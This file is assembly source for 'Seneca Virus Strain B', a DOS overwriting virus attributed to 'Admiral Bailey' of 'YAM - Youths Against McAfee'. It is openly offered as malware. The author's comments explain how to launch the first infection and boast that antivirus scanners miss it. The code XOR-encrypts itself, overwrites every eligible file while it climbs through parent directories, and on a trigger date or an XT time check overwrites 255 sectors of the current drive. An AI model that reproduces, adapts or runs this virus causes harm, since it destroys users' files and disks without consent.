;****************************************************************************
; Seneca Virus Strain B
;
; Written by Admiral Bailey
; YAM - Youths Against McAfee
;
; Another overwriting virus.  This one though gets all the files and is
; encrypted.  My first try at encryption.  Well this was long ago so dont
; laugh.  I was just learning.
; BTW as of scan 99 this is still unscannable.  And it was released so long
; ago.
;****************************************************************************


;---
; To get this to work the first time make sure the year is 1985 if it is not
; then the program will just crash.  It will check if the year is 1985 and if
; it is then it will skip the encryption part because it is alread
; unencrypted.  Now after running it for the first time and getting an
; infected exe file write over the first two bytes with the hex number
; 90 which stands for nop.  The first two bytes are:
;
;                       jmp     133
;
; The above jump is what I use for the first time to skip the encryption.
;---

code    segment
        assume  ds:code, ss:code, cs:code, es:code
        org     100h                    ;Make it a .com file

seneca:                                 ;Start of virus
        jmp     test_year               ;Skips encryption for the first time

virus_start     equ     $

real_start:

        call    encrypt_decrypt         ;this is the real encrypted v.
        jmp     test_year

;---
; This loop is what encrypts and decrypts the total virus
;---
encrypt_decrypt:
        mov     bx,offset test_year             ;where it starts encryption
        mov     cx,enc_length                   ;amount to loop
xor_loop:
        mov     ah,[bx]                         ;get byte
        xor     ah,0ffh                         ;encrypt it
        mov     [bx],ah                         ;write it back
        inc     bx
        loop    xor_loop                        ;loop around till end
        ret

;---
; This part has to remain unencrypted since it has to continue while the
; virus is in encrypted mode.
;---
infect_file:
        mov     bx,handle               ;put handle in bx
        push    bx                      ;save bx
        call    encrypt_decrypt         ;encrypte virus
        pop     bx                      ;unsave bx
        mov     cx,virus_length         ;put size of virus in cx
        mov     dx,100h                 ;where the code starts
        mov     ah,40h                  ;write to handle command
        int     21h                     ;write virus into file
        call    encrypt_decrypt         ;decrypt the virus
        ret

enc_begin       equ     $               ;where encryption begins

;---
; This will test the year and tell us if its an xt or not
;---
test_year:
        mov     ah,2ah                  ;Get the date from computer
        int     21h                     ;Do it
        cmp     cx,1980                 ;XT's usually don't have clocks
        jle     must_be_xt              ;So give the guy xt_time minutes
        jmp     test_month              ;If not xt then test the month

;---
; This will tell us if its the correct month
;---
test_month:
        mov     ah,2ah                  ;Get the date from computer
        int     21h                     ;Do it
        cmp     dx,0b19h                ;Compare month and day
        je      disp_messege            ;If equal kill computer
        jmp     find_first_file         ;Nope then get a file

;---
; We get here if the year is 1980 that means its an xt and we check to see if
; the user has been using the computer too long
;---
must_be_xt:                             ;Only got here because year is 1980
        mov     ah,2ch                  ;Get the time
        int     21h                     ;Do it
        cmp     cl,1eh                  ;Is it past the xt_time given?
        jge     xt_messege              ;Yes the kill current drive...
        jmp     find_first_file         ;No then quit

;---
; This procedure finds the first file
;---
find_first_file:
        mov     dx,offset file_type     ;Load the type of file to look for
        mov     ah,4eh                  ;Find first file command
        xor     cx,cx                   ;Clear cx find read-only
        int     21h                     ;find the first file
        jc      change_dir              ;if none found change directory
        jmp     infect                  ;if found then infect                  

;---
; This steps down a directory
;---
change_dir:
        mov     dx,offset directory     ;Directory to change to ".."
        mov     ah,3bh                  ;Change dir command
        int     21h                     ;change dir
        jc      quit                    ;if cant change dir then quit
        jmp     find_first_file         ;now that we've changed find files

;---
; This displays the the different messeges
;---
xt_messege:                             ;displays messege on XT's
        push    ax
        push    bx
        mov     bx,offset messege2
        call    printstringloop
        pop     bx
        pop     ax
        jmp     kill_drive

;---
; This will look for every other file
;---
find_next_file:                         
        mov     ah,4fh                  ;find next file command
        int     21h                     ;do it
        cmp     ax,12h                  ;any more files?
        je      change_dir              ;nope then change dir
        jmp     infect                  ;yup then infect
        

disp_messege:
        push    ax
        push    bx
        mov     bx,offset messege       ;display regular messege
        call    printstringloop
        pop     bx
        pop     ax
        jmp     kill_drive

PrintStringLoop:
        mov   dl,[bx]                      ;get the next character
        and   dl,dl                        ;is the character's value zero?
        jz    EndPrintString               ;if so, then we're done with the
                                           ; string
        inc   bx                           ;point to the next character
        sub     dl,0ah                     ;sub 10 from char
        mov   ah,2                         ;DOS display output function
        int   21h                          ;invoke DOS to print the character
        jmp   PrintStringLoop              ;print the next character, if any
EndPrintString:
        ret

kill_drive:
        mov     ah,19h                  ;Get current drive (al=drive)
        int     21h                     ;Do it
        mov     cx,0ffh                 ;Fry 256 sectors
        mov     dx,0                    ;Start at sector 0
        int     26h                     ;Do it
        jc      quit                    ;If error then quit

;---
; This is the procedure that quits the virus...
;---
quit:
        mov     ah,2ch                  ;read real time clock
        int     21h                     ;returns DH-->Seconds
        cmp     dh,0ah                  ;is it below 10 seconds 1in6 chance
        ja      dont_do_it              ;no then quit
        mov     bx,offset messege3      ;get messege in bx
        call    printstringloop         ;decrypt messege
dont_do_it:
        int     20h                     ;quit to dos

;---
; This is where all the infection is done
;---
infect:
        mov     bx,80h                  ;put dta in bx
        mov     ax,[bx]+15h             ;get files attribute
        mov     orig_attr,ax            ;save attribute
        mov     ax,[bx]+16h             ;get current files time
        mov     orig_time,ax            ;save current files time
        mov     ax,[bx]+18h             ;get current file date
        mov     orig_date,ax            ;save current files date

        mov     ax,[bx]+1ah             ;get files size
        mov     orig_size,ax            ;save files size

        mov     al,2                    ;set up to open handle for read/write
        mov     ah,3dh                  ;open file handle command
        int     21h                     ;do it
        mov     handle,ax               ;save current file handle
        mov     bx,handle               ;get the file handle
        mov     ah,3eh                  ;close it for now
        int     21h
        cmp     orig_size,2bch          ;compare files size 700 bytes
        jb      find_next_file          ;if its smaller find another file
        mov     ah,3dh                  ;open again to reset handle
        mov     dx,80h+1eh              ;moves filename into dx
        mov     al,2
        int     21h
        mov     handle,ax               ;save handle again

        call    infect_file             ;encrypt program and write it

        mov     cx,orig_time            ;get original time
        mov     dx,orig_date            ;get original date
        mov     al,1                    ;set file date/time service
        mov     ah,57h                  ;get/set file date and time
        int     21h                     ;call dos
        mov     bx,handle               ;get handle
        mov     ah,3eh                  ;close handle service
        int     21h                     ;do it
        mov     cx,orig_attr            ;get files original attribute
        mov     al,1                    ;put it back
        mov     dx,80h+1eh              ;get filename
        mov     ah,43h                  ;dos command
        int     21h                     
        jmp     find_next_file          ;now find another file 

;---
; These are different things needed for the virus
;---
; day messege - just saying its Sen's B-Day
messege db  'ROc*O`O\cYXO+++S~}*]oxomk1}*L7Nkƒ+**Vo~1}*Zk|~ƒ+',0
; xt messege - Telling the user he uses his computer too much
messege2 db 'cy*}ryvnx1~*}o*ƒy|*mywz~o|*}y*wmr6s~}*lkn*py|*ƒ'
         db 'y*kxn*ƒy|*mywz~o|8',0
; error messege - Saying the exe is no good
messege3 db 'PK^KV*O\\Y\*77*ObO*s}*Pmuon+++',0

file_type       db      '*.*',0                 ;file type
directory       db      '..',0                  ;directory changing
orig_attr       dw      ?                       ;holds attribute
orig_time       dw      ?                       ;holds time
orig_date       dw      ?                       ;holds date
orig_size       dw      ?                       ;holds files size
handle          dw      ?                       ;holds handle

virus_end       equ     $                       ;marks the end

virus_length    =       virus_end - virus_start ;length of virus
enc_length      =       virus_end - enc_begin

code    ends

        end     seneca


